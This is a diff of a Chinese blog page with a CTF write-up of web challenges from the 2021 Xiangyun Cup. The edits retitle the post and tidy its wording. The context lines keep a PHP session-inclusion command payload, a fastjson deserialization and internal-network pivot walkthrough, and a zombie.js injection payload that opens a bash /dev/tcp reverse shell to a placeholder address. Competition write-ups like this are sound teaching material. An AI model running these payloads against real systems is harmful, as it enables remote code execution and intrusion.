@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="">
-  <title>2021祥云杯个人web部分wp | fmyyy</title>
+  <title>2021祥云杯web部分wp | fmyyy</title>
   <meta name="author" content="fmyyy" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -17,14 +17,14 @@
   
   <meta name="description" content="前言体验还行 ezyii说是最新的链子，题目把文件都筛选好了让我们找。写一下我的思路看到RunProcess类 1234567891011121314151617181920212223242526272829303132&lt;?phpnamespace Codeception\Extension;class RunProcess&amp;#123;    protected $output;    p">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2021祥云杯个人web部分wp">
+<meta property="og:title" content="2021祥云杯web部分wp">
 <meta property="og:url" content="https://fmyyy.gitee.io/2021/09/21/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%AA%E4%BA%BAweb%E9%83%A8%E5%88%86wp/index.html">
 <meta property="og:site_name" content="fmyyy">
 <meta property="og:description" content="前言体验还行 ezyii说是最新的链子，题目把文件都筛选好了让我们找。写一下我的思路看到RunProcess类 1234567891011121314151617181920212223242526272829303132&lt;?phpnamespace Codeception\Extension;class RunProcess&amp;#123;    protected $output;    p">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fmyyy.gitee.io/null">
 <meta property="article:published_time" content="2021-09-21T13:14:04.000Z">
-<meta property="article:modified_time" content="2021-09-21T13:56:58.535Z">
+<meta property="article:modified_time" content="2021-09-21T14:00:41.124Z">
 <meta property="article:author" content="fmyyy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://fmyyy.gitee.io/null">
@@ -160,7 +160,7 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">2021祥云杯个人web部分wp</h1>
+                <h1 class="kratos-entry-title text-center">2021祥云杯web部分wp</h1>
             
             
             <ul class="kratos-post-meta text-center">
@@ -170,7 +170,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~5.71K
+                        ~5.70K
                     
                     字
                 </li>
@@ -179,7 +179,7 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1632232618535"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1632232841124"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
@@ -204,7 +204,7 @@
 <p>包含一下session文件呗<br>payload:</p>
 <p><a target="_blank" rel="noopener" href="http://127.0.0.1/admin/include123.php?u=/tmp/sess_%E4%BD%A0%E7%9A%84PHPSESSID&amp;payload=">http://127.0.0.1/admin/include123.php?u=/tmp/sess_你的PHPSESSID&amp;payload=</a><?=\`cat\t/getf???.sh`?><br>成功了 挺奇怪的 源码里ban了反引号我这里却可以用 不管了 flag出了就行。</p>
 <h1 id="层层穿透"><a href="#层层穿透" class="headerlink" title="层层穿透"></a>层层穿透</h1><p>这题做了好久，只会一点java的我靠着github上的一键shell poc做完了<br>第一层反弹shell，github有直接可以利用的工具<br><img src="https://img-blog.csdnimg.cn/f7b122c6fbca457f9589a2ad5b3809bc.png" alt="在这里插入图片描述"></p>
-<p>弹个shell到自己的vps上。<br>题目提示内网<br>信息搜集到了10.10.1.11:8080,估计是内网web环境，先把附件源码反编译一下，因为题目环境20分钟刷新一次，所以现在本地打<br>对着源码逻辑先登录，账号密码源码里可以直接找到<br><img src="https://img-blog.csdnimg.cn/08abfdf0dfe449449fc727173e2ec46e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>弹个shell到自己的公网上。<br>题目提示内网<br>信息搜集到了10.10.1.11:8080,估计是内网web环境，先把附件源码反编译一下，因为题目环境20分钟刷新一次，所以现在本地打<br>对着源码逻辑先登录，账号密码源码里可以直接找到<br><img src="https://img-blog.csdnimg.cn/08abfdf0dfe449449fc727173e2ec46e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>看到admin/test路由存在fastjson反序列化点。<br>不怎么会java反序列化，但是github上有不出网直接在数据包里回显的一键shellpoc<br><a target="_blank" rel="noopener" href="https://github.com/depycode/fastjson-c3p0">https://github.com/depycode/fastjson-c3p0</a><br>照着github上的readme直接打，发现提示太短，看源码<br><img src="https://img-blog.csdnimg.cn/a753c20807b74e7aa6eb0bce72f5dd4a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把poc复制两边再打就打通了<br>本地打通了，之后是题目。我花了大部分时间在搞代理 有几个小时吧 最后选择了frp 确实方便<br><a target="_blank" rel="noopener" href="https://hackergu.com/frps-kali/">frp教程</a><br>端口转发成功后按照刚刚本地的步骤直接打就行<br><img src="https://img-blog.csdnimg.cn/483ae96e7bfa49babd8a1ce319f87e66.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（一定找个时间好好学java）</p>
 <h1 id="Crawer-z"><a href="#Crawer-z" class="headerlink" title="Crawer_z"></a>Crawer_z</h1><p><img src="https://img-blog.csdnimg.cn/b6ad81601b6f46ceb995a071a5f5ed4d.png" alt="在这里插入图片描述"><br>引用了zombie框架，谷歌查找 全网只找到这个框架一篇漏洞<br><a target="_blank" rel="noopener" href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a><br>漏洞描述<br><img src="https://img-blog.csdnimg.cn/aba409232272439c9c9608513b168cd4.png" alt="在这里插入图片描述"><br>攻击者可以在他们的页面中插入JS代码来利用zombiejs代码注入漏洞。如果使用zombiejs 抓取此类页面，则运行爬虫的机器将运行攻击者提供的任意命令。为了比较，jsdom 默认禁用脚本执行。</p>
 <p>想办法让题目访问我们准备的恶意页面就行。<br>payload在这个博客里都准备好了，提取一下</p>
@@ -213,8 +213,8 @@
 <p>改成弹shell的</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;constructor&#x27;</span>;<span class="built_in">this</span>[c][c](<span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;var sync=require(&#x27;child_process&#x27;).spawnSync; var ls = sync(&#x27;bash&#x27;, [&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;],); console.log(ls.output.toString());&quot;</span>)()</span><br></pre></td></tr></table></figure>
 
-<p>有了payload，我们要想办法让题目访问我们的恶意页面。看一下源码。<br>在user.js下<br><img src="https://img-blog.csdnimg.cn/c9177b737913431aa029ad706c0fc906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到访问/user/bucket似乎会自动访问我们个人信息里设置的bucket，尝试访问。<br><img src="https://img-blog.csdnimg.cn/ebbed7c8f7364729baafc34543fd41dc.png" alt="在这里插入图片描述"><br>尝试更改bucket设置，先看源码<br><img src="https://img-blog.csdnimg.cn/befb6a4a5e3246bc9a2eba4e5d28ffa4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>在checkBucket函数下，看到bucket的要求，必须以http:或者https:为开头，且必须包含oss-cn-beijing.ichunqiu.com</code><br>我们尝试修改前面为自己的vps地址<br><img src="https://img-blog.csdnimg.cn/b4a67b9931f34e01bd4259723dcc97d2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击更新<br><img src="https://img-blog.csdnimg.cn/7987e98d4aa245c79301e5986c30db73.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>变回原来的了，并且提示admin会来检查，但在源码里看到<br><img src="https://img-blog.csdnimg.cn/1d6bba599d594c2081c4c4994a528ce0.png" alt="在这里插入图片描述"><br>这里其实算是更改失败了，admin不会去检查<br><img src="https://img-blog.csdnimg.cn/2fd3753b7d814a14833af6e600acdedd.png" alt="在这里插入图片描述"><br>源码里有个重定向到<br>/user/verify?token=${authToken}，我们尝试用队伍token<br>浏览器url输入队伍token<br><img src="https://img-blog.csdnimg.cn/01bf22d099f74f74ae3bc429e900d120.png" alt="在这里插入图片描述"><br>修改bucket，但不要点击update，直接在访问我们放入队伍token后的url<br><img src="https://img-blog.csdnimg.cn/d713cdf68c6e4c9fa948ed41c3b75423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示更改成功 看到我们的bucket也被设置成了我们的vps地址<br>其实这里我还没怎么懂原理，只是试了一下发现可以，那就歪打正着直接用。<br><img src="https://img-blog.csdnimg.cn/a2e7b8bb30cc4d87986f4b80c9050cbc.png" alt="在这里插入图片描述"><br>再访问/user/bucket<br><img src="https://img-blog.csdnimg.cn/feeb27b89ec54911a069e17ff189e8af.png" alt="在这里插入图片描述"><br>回显的内容变了，报错404，这是因为我的vps上没有oss-cn-beijing.ichunqiu.com这个文件。<br><code>到这里思路就很清晰了，我们在vps上放置一个oss-cn-beijing.ichunqiu.com.html恶意文件，然后修改bucket为http://公网ip地址/oss-cn-beijing.ichunqiu.com.html</code><br>并且这个html文件已经被我们插入了用&lt;script&gt;标签包裹的恶意payload<br><img src="https://img-blog.csdnimg.cn/125545354543492c85cbc37b09344ad7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>服务器起个监听<br><img src="https://img-blog.csdnimg.cn/6e7fa1e56b664f6fbed1e3abdc074dc8.png" alt="在这里插入图片描述"><br>题目内访问/user/bucket<br><img src="https://img-blog.csdnimg.cn/1f1bc9111abd40e9a4fdfe750a1774f7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/37c61dacd41a4ae698c02013138d8b93.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>弹成功了。</p>
+<p>有了payload，我们要想办法让题目访问我们的恶意页面。看一下源码。<br>在user.js下<br><img src="https://img-blog.csdnimg.cn/c9177b737913431aa029ad706c0fc906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到访问/user/bucket似乎会自动访问我们个人信息里设置的bucket，尝试访问。<br><img src="https://img-blog.csdnimg.cn/ebbed7c8f7364729baafc34543fd41dc.png" alt="在这里插入图片描述"><br>尝试更改bucket设置，先看源码<br><img src="https://img-blog.csdnimg.cn/befb6a4a5e3246bc9a2eba4e5d28ffa4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>在checkBucket函数下，看到bucket的要求，必须以http:或者https:为开头，且必须包含oss-cn-beijing.ichunqiu.com</code><br>我们尝试修改前面为自己的公网ip地址<br><img src="https://img-blog.csdnimg.cn/b4a67b9931f34e01bd4259723dcc97d2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击更新<br><img src="https://img-blog.csdnimg.cn/7987e98d4aa245c79301e5986c30db73.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>变回原来的了，并且提示admin会来检查，但在源码里看到<br><img src="https://img-blog.csdnimg.cn/1d6bba599d594c2081c4c4994a528ce0.png" alt="在这里插入图片描述"><br>这里其实算是更改失败了，admin不会去检查<br><img src="https://img-blog.csdnimg.cn/2fd3753b7d814a14833af6e600acdedd.png" alt="在这里插入图片描述"><br>源码里有个重定向到<br>/user/verify?token=${authToken}，我们尝试用队伍token<br>浏览器url输入队伍token<br><img src="https://img-blog.csdnimg.cn/01bf22d099f74f74ae3bc429e900d120.png" alt="在这里插入图片描述"><br>修改bucket，但不要点击update，直接在访问我们放入队伍token后的url<br><img src="https://img-blog.csdnimg.cn/d713cdf68c6e4c9fa948ed41c3b75423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示更改成功 看到我们的bucket也被设置成了我们的服务器地址<br>其实这里我还没怎么懂原理，只是试了一下发现可以，那就歪打正着直接用。<br><img src="https://img-blog.csdnimg.cn/a2e7b8bb30cc4d87986f4b80c9050cbc.png" alt="在这里插入图片描述"><br>再访问/user/bucket<br><img src="https://img-blog.csdnimg.cn/feeb27b89ec54911a069e17ff189e8af.png" alt="在这里插入图片描述"><br>回显的内容变了，报错404，这是因为我的公网上没有oss-cn-beijing.ichunqiu.com这个文件。<br><code>到这里思路就很清晰了，我们在公网上放置一个oss-cn-beijing.ichunqiu.com.html恶意文件，然后修改bucket为http://公网ip地址/oss-cn-beijing.ichunqiu.com.html</code><br>并且这个html文件已经被我们插入了用&lt;script&gt;标签包裹的恶意payload<br><img src="https://img-blog.csdnimg.cn/125545354543492c85cbc37b09344ad7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>服务器起个监听<br><img src="https://img-blog.csdnimg.cn/6e7fa1e56b664f6fbed1e3abdc074dc8.png" alt="在这里插入图片描述"><br>题目内访问/user/bucket<br><img src="https://img-blog.csdnimg.cn/1f1bc9111abd40e9a4fdfe750a1774f7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/37c61dacd41a4ae698c02013138d8b93.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>弹成功了。</p>
 <p>这次比赛就做了这四道题，做完java那题距比赛结束就1小时了，被队友带飞进了前三十 队友们tql</p>
 
         </div>
@@ -282,7 +282,7 @@
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
             const hostUrl       = "https://fmyyy.gitee.io/2021/09/21/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%AA%E4%BA%BAweb%E9%83%A8%E5%88%86wp/";
-            const title         = "「2021祥云杯个人web部分wp」";
+            const title         = "「2021祥云杯web部分wp」";
             const excerpt       = `前言体验还行
 ezyii说是最新的链子，题目把文件都筛选好了让我们找。写一下我的思路看到RunProcess类
 1234567891011121314151617181920212223242526272829303132&lt;?p...`;
@@ -312,15 +312,6 @@ ezyii说是最新的链子，题目把文件都筛选好了让我们找。写一
             </div>
         </footer>
     </div>
-    
-        <nav class="navigation post-navigation clearfix" role="navigation">
-            
-            <div class="nav-previous clearfix">
-                <a title=" Hello World" href="/2021/09/21/hello-world/">&lt; 上一篇</a>
-            </div>
-            
-            
-        </nav>
     
     
 </article>
@@ -385,13 +376,7 @@ ezyii说是最新的链子，题目把文件都筛选好了让我们找。写一
         
           
           
-            <a class="list-group-item" href="/2021/09/21/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%AA%E4%BA%BAweb%E9%83%A8%E5%88%86wp/"><i class="fa  fa-book"></i> 2021祥云杯个人web部分wp</a>
-            
-          
-        
-          
-          
-            <a class="list-group-item" href="/2021/09/21/hello-world/"><i class="fa  fa-book"></i> Hello World</a>
+            <a class="list-group-item" href="/2021/09/21/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%AA%E4%BA%BAweb%E9%83%A8%E5%88%86wp/"><i class="fa  fa-book"></i> 2021祥云杯web部分wp</a>
             
           
         
